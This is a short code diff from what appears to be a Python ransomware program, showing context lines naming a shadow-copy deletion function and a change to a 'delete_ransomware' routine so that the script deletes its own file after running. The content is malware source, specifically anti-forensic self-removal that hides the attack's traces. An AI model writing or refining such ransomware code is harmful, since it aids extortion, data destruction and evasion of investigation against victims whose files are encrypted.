@@ -155,10 +155,7 @@ def dlt_shadow_copy():
 
 
 def delete_ransomware():
-    usr = getpass.getuser()
-    ransomware_path = 'C:/Users/' + usr
-    for ransomware in glob.glob(ransomware_path + '/**/ransomware.py', recursive=True):
-        os.remove(ransomware)
+    os.remove(sys.argv[0])
 
 
 def main():
